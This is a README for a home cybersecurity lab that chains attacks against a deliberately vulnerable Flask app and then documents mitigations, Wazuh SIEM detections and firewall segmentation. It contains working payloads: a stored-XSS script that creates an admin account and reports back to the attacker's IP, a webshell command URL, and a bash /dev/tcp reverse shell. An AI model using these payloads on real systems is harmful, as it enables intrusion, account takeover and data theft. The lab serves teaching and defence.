# Vulnerable Web Application — Full Attack & Defense Lab

A hands-on cybersecurity home lab simulating a realistic attack chain against a deliberately vulnerable web application, with network segmentation, a SIEM, and documented mitigations.

---

## Overview

This project demonstrates an end-to-end offensive and defensive security workflow:

- A Kali Linux attacker simulates a real-world intrusion using the **Cyber Kill Chain** framework
- A segmented network (OPNsense firewall, DMZ, LAN) provides a realistic enterprise infrastructure
- **Wazuh SIEM** monitors all layers of the stack, from network to application
- Each vulnerability is **identified, exploited, documented, and mitigated**

The goal is not just to "run attacks", but to understand *why* each vulnerability exists, how it fits into a broader attack chain, and what concrete controls can break it.

---

## Architecture

```
[ ATTACKER (WAN) ]
  Kali Linux — 10.10.10.10
          │
          ▼ Port 80
┌─────────────────────────────────────┐
│         OPNsense Firewall           │
│  WAN  : 10.10.10.1                  │
│  DMZ  : 10.10.20.1                  │
│  LAN  : 192.168.1.1                 │
│                                     │
│  DNAT  : WAN:80  → 10.10.20.10:80   │
│  Rule  : DMZ → LAN TCP 5000         │
└──────────────┬──────────────────────┘
               │
    ┌──────────┴──────────────┐
    ▼                         ▼
┌────────────────┐     ┌─────────────────────┐
│  Nginx (DMZ)   │────►│  Flask App (LAN)     │
│  10.10.20.10   │     │  192.168.1.2 :5000   │
│                │     │                      │
│  Reverse proxy │     │  Wazuh Agent         │
│  Wazuh Agent   │     │  App logs / FIM      │
└────────────────┘     └──────────┬───────────┘
                                  │
                                  ▼
                       ┌──────────────────────┐
                       │  Wazuh Manager (LAN) │
                       │  192.168.1.30        │
                       │  SIEM / Alerting     │
                       └──────────────────────┘
```

**Key design decisions**

- The Flask backend is never directly exposed — all traffic passes through the reverse proxy in the DMZ
- Wazuh agents sit on every host; logs from Nginx, the app, and the OS are all correlated centrally
- OPNsense enforces strict inter-zone rules: the attacker can only reach the DMZ on port 80, never the LAN directly

---

## Cyber Kill Chain

### 1. [Reconnaissance](docs/01-recons.md)
**Tools:** Nmap, ffuf

Port scan reveals an HTTP service on port 80. Directory fuzzing exposes admin routes and upload functionality.

```bash
nmap -sV -p 80 10.10.10.1
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
     -u http://10.10.10.1/FUZZ -mc 200,301,302,403
```

---

### 2. [Weaponization & Delivery: CSRF via Stored XSS](docs/02-xss-crf.md)

**Vulnerabilities:** Stored XSS + missing CSRF protection (Flask does not enable it by default)

A stored XSS payload is injected into a comment field. When an admin visits the page, the payload executes in their browser session and silently sends a forged POST request to `/admin/createuser`:

```javascript
fetch('/admin/createuser', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'username=hacker&password=pwned123&role=admin'
})
.then(r => fetch('http://10.10.10.10:8000/log?status=' + r.status));
```

Because Flask has no CSRF protection out of the box (unlike Django or Laravel), the server accepts the request as legitimate — the admin's session cookie is sent automatically by the browser.

**Result:** A new admin account is created without the administrator's knowledge.

> **Why this works:** Flask is a micro-framework — CSRF protection must be explicitly added via `Flask-WTF`. A developer unfamiliar with this will ship a vulnerable app by default.

---

### 3. [Exploitation: Authentication & Access Control Failures](docs/03-webshell.md)

**Vulnerability:** Unrestricted file upload

Logged in as the newly created admin, the attacker uploads a PHP webshell via an admin upload form that validates only the file extension, not the real MIME type

---

### 4. [Installation: Webshell Execution](docs/03-webshell.md)

The uploaded webshell is accessible at `/uploads/shell.php` and executes OS commands via GET parameters:

```
http://target/uploads/shell.php?cmd=id
→ uid=1000(www-data) gid=1000(www-data)
```

---

### 5. [Command & Control: Reverse Shell](docs/04-reverse-shell.md)

The webshell is used to trigger a reverse shell back to Kali:

```bash
# Listener on Kali
nc -lvnp 4444

# Payload sent via webshell
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

---

### 6. [Actions on Objectives: Data Exfiltration & Persistence](docs/05-persistence.md)

With a stable shell on the backend server, the attacker:

- Dumps the SQLite database (`/var/www/app/database.db`)
- Reads `/etc/passwd` and application secrets
- Accesses the honeyfile `/var/www/app/backup_credentials.txt` — triggering an immediate Wazuh CRITICAL alert

---

## Vulnerabilities & Mitigations

| # | Vulnerability | OWASP | Impact | Mitigation |
|---|---|---|---|---|
| 1 | Stored XSS | A03 | Executes attacker code in victim's browser | Escape all output with `markupsafe.escape()`, use Jinja2 autoescaping |
| 2 | Missing CSRF protection | A01 | Forged admin actions via XSS | Add `Flask-WTF` CSRFProtect, validate CSRF token server-side |
| 3 | IDOR on user profiles | A01 | Access any user's data by ID | Enforce server-side ownership check: `if current_user.id != profile.id: abort(403)` |
| 4 | Unrestricted file upload | A05 | Webshell upload, code execution | Whitelist extensions, validate real MIME type, store uploads outside webroot |
| 5 | SQL Injection on login | A03 | Authentication bypass, data extraction | Use parameterized queries: `cursor.execute("SELECT * FROM users WHERE username = ?", (username,))` |
| 6 | Debug mode enabled | A05 | Exposes stack traces and Werkzeug console | Set `debug=False` in production, use environment variables for config |
| 7 | Server-side role validation missing | A01 | Privilege escalation via crafted POST | Whitelist valid roles server-side, never trust client-submitted role values |

---

## Detection

| Kill Chain Step | Detected by Default | Detection Method |
|---|---|---|
| Port scan (Nmap) | Partial | Portscan rule if multiple SYN packets detected |
| Directory fuzzing (ffuf) | No | Custom rule on Nginx: >50 404s/min = HIGH alert |
| Login brute force | Yes | Wazuh rules - Auth failures |
| Webshell upload | Yes | FIM alert on `/var/www/uploads/` (new file created) |
| Reverse shell | Partial | Outbound connection on non-standard port |
| Honeyfile access | Yes (CRITICAL) | FIM configured with `report_changes=yes` on honeyfile |

> Notable finding: SQL injection and IDOR generate no alerts out of the box, SAST (Bandit/Semgrep) is required to catch these before deployment. This illustrates why SAST and SIEM are complementary, not interchangeable.

---

## Network Defenses

### OPNsense Firewall Rules
- WAN → DMZ: only TCP/80 allowed (DNAT to Nginx)
- DMZ → LAN: only TCP/5000 allowed (Nginx → Flask)
- LAN → WAN: blocked by default (no outbound internet from backend)
- Attacker cannot reach Wazuh manager or backend directly

### Nginx Reverse Proxy (Mitigations applied post-attack)
```nginx
# Rate limiting — breaks ffuf enumeration
limit_req_zone $binary_remote_addr zone=app:10m rate=20r/m;
limit_req zone=app burst=20 nodelay;
```

---

## Honeyfile

A fake credentials file placed in the web directory:

```
/var/www/app/backup_credentials.txt
```

Wazuh is configured to fire a CRITICAL alert the instant this file is read. During the attack simulation, this alert triggered at step 6 — confirming that even after full compromise, defenders have a detection opportunity.

---

## CI/CD Security Pipeline

See the detailed [CI/CD security pipeline documentation](docs/08-ci-cd-pipelines.md).

The application's source code is also scanned automatically on every push via a GitLab CI/CD pipeline:

```
Push → SAST (Bandit) → SCA (OwASP dependency-check) → Secret Scan (Gitleaks) → Block if critical findings
```

This closes the loop between the defensive lab (runtime detection) and secure development (shift-left scanning).

---

## Tools Used

| Category | Tool | Purpose |
|---|---|---|
| Firewall | OPNsense | Network segmentation, DNAT, zone rules |
| Reverse Proxy | Nginx | DMZ entry point, rate limiting, header hardening |
| SIEM | Wazuh | Log aggregation, FIM, alerting, honeyfile detection |
| SAST | Bandit | Static analysis of Python source code |
| SCA | OWASP dependency-check | Known CVEs in dependencies |
| Secret Scanning | Gitleaks | Prevents credential commits |
| Attacker OS | Kali Linux | Nmap, ffuf, Metasploit, nc |

---

## Key Takeaways

1. **Vulnerability chaining matters more than individual flaws.** A stored XSS alone is medium severity. Chained with missing CSRF protection and a lack of server-side role validation, it becomes a full account takeover.

2. **Framework defaults are not the same as secure defaults.** Flask does not enable CSRF protection by default; understanding what a framework does *not* do for you is as important as knowing what it does.

3. **SAST and SIEM are complementary.** IDOR and business logic flaws are invisible to runtime monitoring, they must be caught during code review or SAST. Conversely, a webshell upload is invisible to SAST but immediately visible to FIM.

4. **Network segmentation limits blast radius.** Even with a full reverse shell on the backend server, the attacker could not pivot to the Wazuh manager or other LAN hosts without bypassing additional firewall rules.
